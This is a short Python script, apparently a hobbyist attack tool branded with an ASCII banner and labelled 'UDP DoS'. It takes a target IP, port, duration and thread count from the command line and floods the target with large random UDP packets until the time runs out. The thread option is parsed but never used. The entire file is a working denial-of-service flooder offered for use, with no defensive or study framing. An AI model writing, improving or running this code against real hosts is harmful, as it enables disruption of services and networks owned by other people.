import socket, threading, time, os, random, sys

def banner():
    print("""

██╗  ██╗███╗   ██╗██╗   ██╗██╗     ██╗      ██████╗ ██████╗ ██████╗ ███████╗
╚██╗██╔╝████╗  ██║██║   ██║██║     ██║     ██╔════╝██╔═══██╗██╔══██╗██╔════╝
 ╚███╔╝ ██╔██╗ ██║██║   ██║██║     ██║     ██║     ██║   ██║██║  ██║█████╗  
 ██╔██╗ ██║╚██╗██║██║   ██║██║     ██║     ██║     ██║   ██║██║  ██║██╔══╝  
██╔╝ ██╗██║ ╚████║╚██████╔╝███████╗███████╗╚██████╗╚██████╔╝██████╔╝███████╗
╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝
                                                                            
                                   
                            [UDP DoS]
    """)



threads = []

banner()
if len(sys.argv) !=5:
    print(f"Use: python3 {sys.argv[0]} <ip> <port> <time> <threads>")
    sys.exit(1)
    
target=sys.argv[1]
port=sys.argv[2]
timer = int(sys.argv[3])
threads = int(sys.argv[4])

#create socket, packet
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 

victim_ip = target 
attack_port = int(port)

sent = 0 
standard_time = time.time()
print (f'Attack Started To: {target}:{port} Time: {timer} Threads: {threads}')
standard_time = time.time()

#def run():
packet_size = random._urandom(65500) 
while True: 
    end = time.time()
            
    if(end - standard_time < timer):
        sock.sendto(packet_size, (victim_ip, attack_port))
        sent = sent + 1
    else:
        exit()
    
